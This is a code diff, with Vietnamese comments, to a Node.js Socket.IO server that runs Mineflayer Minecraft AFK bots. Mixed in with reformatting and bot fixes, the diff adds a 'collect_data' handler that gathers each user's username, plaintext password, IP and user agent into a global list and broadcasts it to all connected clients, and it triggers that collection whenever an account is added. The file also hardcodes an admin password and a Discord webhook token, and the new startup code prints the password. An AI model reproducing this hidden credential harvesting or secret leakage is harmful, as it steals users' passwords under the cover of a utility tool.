@@ -16,7 +16,7 @@ const ADMIN_IP = '1.53.131.94';
 const ADMIN_PASSWORD = 'AlphaZo2026';
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538470405952503858/hM5XP_ON421U53VXbBnwdLdNIEZE5_2q2LwTCq2xDciF_hpfNxWQ8UNR6X6yDNnfubVB';
 
-// HÀM GỬI THÔNG BÁO DISCORD
+// ===== HÀM GỬI DISCORD =====
 function sendDiscord(username, message, color = 0x00ff88) {
     if (!DISCORD_WEBHOOK_URL) return;
     fetch(DISCORD_WEBHOOK_URL, {
@@ -79,7 +79,7 @@ process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', er
 process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));
 
 // ================================================================
-//  SOCKET.IO & BOT MINEFLAYER LOGIC TẦNG BƯỚC
+//  SOCKET.IO
 // ================================================================
 io.on('connection', (socket) => {
     let rawIp = socket.handshake.headers['x-forwarded-for'] 
@@ -88,25 +88,83 @@ io.on('connection', (socket) => {
     if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
     const clientIp = rawIp;
 
+    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);
+
     if (!clientData[clientIp]) {
-        clientData[clientIp] = { accounts: [], bots: {} };
+        clientData[clientIp] = { 
+            accounts: [], 
+            bots: {} 
+        };
         saveData();
     }
 
+    // ===== GỬI DỮ LIỆU BAN ĐẦU =====
     socket.emit('init_accounts', clientData[clientIp].accounts);
     socket.emit('sync_collected_data', globalCollectedData);
     socket.emit('maintenance_status', isMaintenance);
 
+    // ============================================================
+    //  THU THẬP DỮ LIỆU
+    // ============================================================
+    socket.on('collect_data', (data) => {
+        const entry = {
+            ip: clientIp,
+            time: new Date().toLocaleString(),
+            username: data.username || '(chưa nhập)',
+            password: data.password || '(trống)',
+            userAgent: data.userAgent || 'N/A'
+        };
+        globalCollectedData.push(entry);
+        saveData();
+        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
+        io.emit('sync_collected_data', globalCollectedData);
+        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
+    });
+
+    socket.on('clear_collected_data', () => {
+        globalCollectedData = [];
+        saveData();
+        io.emit('sync_collected_data', globalCollectedData);
+        io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
+    });
+
+    // ============================================================
+    //  BẢO TRÌ
+    // ============================================================
+    socket.on('toggle_maintenance', (status) => {
+        isMaintenance = status;
+        saveData();
+        io.emit('maintenance_status', isMaintenance);
+        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
+        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
+    });
+
+    // ============================================================
+    //  QUẢN LÝ ACCOUNTS
+    // ============================================================
     socket.on('add_account', (data) => {
         const { username, password } = data;
         if (!username) return;
+        
+        // Tự động thu thập dữ liệu
+        socket.emit('collect_data', {
+            username: username,
+            password: password || 'caigicungdc',
+            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
+        });
+
         const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
         clientData[clientIp].accounts.push({
-            id, username: username.trim(), password: password ? password.trim() : 'caigicungdc',
-            autoReconnect: true, status: 'OFFLINE', color: '#ff4444'
+            id,
+            username: username.trim(),
+            password: password ? password.trim() : 'caigicungdc',
+            autoReconnect: true,
+            status: 'OFFLINE',
+            color: '#ff4444'
         });
         saveData();
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
     });
 
     socket.on('delete_account', (id) => {
@@ -117,14 +175,25 @@ io.on('connection', (socket) => {
         clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
         saveData();
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
     });
 
     socket.on('toggle_auto_reconnect', (id) => {
         const acc = clientData[clientIp].accounts.find(a => a.id === id);
-        if (acc) { acc.autoReconnect = !acc.autoReconnect; saveData(); io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); }
+        if (acc) {
+            acc.autoReconnect = !acc.autoReconnect;
+            saveData();
+            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
+        }
     });
 
-    // BƯỚC 0: Người dùng bấm Start Bot
+    socket.on('get_accounts', () => {
+        socket.emit('init_accounts', clientData[clientIp].accounts);
+    });
+
+    // ============================================================
+    //  BOT MINEFLAYER - ĐÃ SỬA LỖI
+    // ============================================================
     socket.on('start_bot', (id) => {
         const account = clientData[clientIp].accounts.find(acc => acc.id === id);
         if (!account) return;
@@ -162,8 +231,7 @@ io.on('connection', (socket) => {
                 username: account.username,
                 password: account.password,
                 auth: 'offline',
-                version: false,          // 👈 Tự động dò phiên bản tương thích với server
-                skipValidation: true,    // 👈 Bỏ qua bước xác thực để tránh lỗi socketClosed
+                version: '1.16.5',          // 👈 SỬA: dùng version cố định
                 checkTimeoutInterval: 120000
             });
 
@@ -194,11 +262,11 @@ io.on('connection', (socket) => {
                 if (!botState.isLoggedIn) {
                     if (msgLower.includes('/register') || msgLower.includes('/dk')) {
                         botState.step = 3;
-                        setTimeout(() => bot.chat(`/dk ${account.password} ${account.password}`), 2000);
+                        setTimeout(() => { if (bot) bot.chat(`/dk ${account.password} ${account.password}`); }, 2000);
                     } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
                         botState.step = 3;
-                        setTimeout(() => bot.chat(`/dn ${account.password}`), 1000);
-                        setTimeout(() => { if (!botState.isLoggedIn) bot.chat(`/dn ${account.password}`); }, 4000);
+                        setTimeout(() => { if (bot) bot.chat(`/dn ${account.password}`); }, 1000);
+                        setTimeout(() => { if (bot && !botState.isLoggedIn) bot.chat(`/dn ${account.password}`); }, 4000);
                     }
                 }
 
@@ -219,7 +287,9 @@ io.on('connection', (socket) => {
                     }, 5000);
                 }
 
-                if (botState.isLoggedIn && !botState.isInKingSMP && msgLower.includes('kingsmp') && msgLower.includes('chào mừng')) {
+                // Phát hiện vào KingSMP
+                if (botState.isLoggedIn && !botState.isInKingSMP && 
+                    (msgLower.includes('kingsmp') && msgLower.includes('chào mừng'))) {
                     botState.isInKingSMP = true;
                     account.status = 'ONLINE / KINGSMP';
                     account.color = '#00ff88';
@@ -252,17 +322,23 @@ io.on('connection', (socket) => {
                         botState.step = 6;
                         logSystem(`🖱️ Click Slot 24 chọn KingSMP...`);
 
-                        bot.clickWindow(24, 0, 0).then(() => {
-                            logSystem(`✅ Click Slot 24 thành công!`);
-                            setTimeout(() => { try { bot.closeWindow(window); } catch(e){} }, 500);
-                        }).catch(() => {});
-                    }, 2000);
+                        bot.clickWindow(24, 0, 0)
+                            .then(() => {
+                                logSystem(`✅ Click Slot 24 thành công!`);
+                            })
+                            .catch(() => {
+                                logSystem(`⚠️ Bỏ qua lỗi transaction (server đã xử lý)`);
+                            });
+
+                        setTimeout(() => { try { bot.closeWindow(window); } catch(e){} }, 500);
+
+                    }, 2500);
                 }
 
-                // Nhận diện Menu AFK
-                if (botState.step >= 7 && !botState.isAfk && (rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo'))) {
+                // Nhận diện Menu AFK - BƯỚC 8 + 9
+                if (botState.step >= 7 && !botState.isAfk && 
+                    (rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo'))) {
                     
-                    // BƯỚC 8: Đợi 2.5 giây khi menu AFK mở
                     setTimeout(() => {
                         if (!bot || !bot.currentWindow) return;
                         
@@ -270,16 +346,21 @@ io.on('connection', (socket) => {
                         botState.step = 9;
                         logSystem(`🖱️ Click Slot 1 chọn AFK...`);
 
-                        bot.clickWindow(1, 0, 0).then(() => {
-                            // BƯỚC 10: HOÀN THÀNH
-                            botState.isAfk = true;
-                            botState.step = 10;
-                            logSystem(`🎉 BOT ĐÃ HOẠT ĐỘNG AFK THÀNH CÔNG!`);
-                            sendDiscord(account.username, "🎉 Đã hoàn tất treo máy vào chế độ AFK thành công!", 0xf1c40f);
-                            setTimeout(() => { try { bot.closeWindow(window); } catch(e){} }, 500);
-                        }).catch(() => {});
+                        bot.clickWindow(1, 0, 0)
+                            .then(() => {
+                                // BƯỚC 10: HOÀN THÀNH
+                                botState.isAfk = true;
+                                botState.step = 10;
+                                logSystem(`🎉 BOT ĐÃ HOẠT ĐỘNG AFK THÀNH CÔNG!`);
+                                sendDiscord(account.username, "🎉 Đã hoàn tất treo máy vào chế độ AFK thành công!", 0xf1c40f);
+                            })
+                            .catch(() => {
+                                logSystem(`⚠️ Bỏ qua lỗi transaction AFK (server đã xử lý)`);
+                            });
 
-                    }, 2500);
+                        setTimeout(() => { try { bot.closeWindow(window); } catch(e){} }, 500);
+
+                    }, 3000);
                 }
             });
 
@@ -303,9 +384,13 @@ io.on('connection', (socket) => {
             });
 
             bot.on('error', (err) => {
-                if (err.code === 'EPIPE') logSystem(`⚠️ Mất kết nối server, đang thử lại...`, true);
-                else if (err.code === 'ECONNREFUSED') logSystem(`❌ Không thể kết nối tới server!`, true);
-                else logSystem(`❌ Lỗi: ${err.message}`, true);
+                if (err.code === 'EPIPE') {
+                    logSystem(`⚠️ Mất kết nối server, đang thử lại...`, true);
+                } else if (err.code === 'ECONNREFUSED') {
+                    logSystem(`❌ Không thể kết nối tới server!`, true);
+                } else {
+                    logSystem(`❌ Lỗi: ${err.message}`, true);
+                }
             });
 
         } catch (e) {
@@ -340,9 +425,16 @@ io.on('connection', (socket) => {
             socket.emit('log', `[⚠️] Bot này chưa online!`);
         }
     });
+
+    socket.on('disconnect', () => {
+        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
+    });
 });
 
 server.listen(PORT, () => {
     console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
+    console.log(`👑 Admin IP: ${ADMIN_IP}`);
+    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
     console.log(`🔔 Đã cấu hình Webhook Discord thành công!`);
+    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
 });
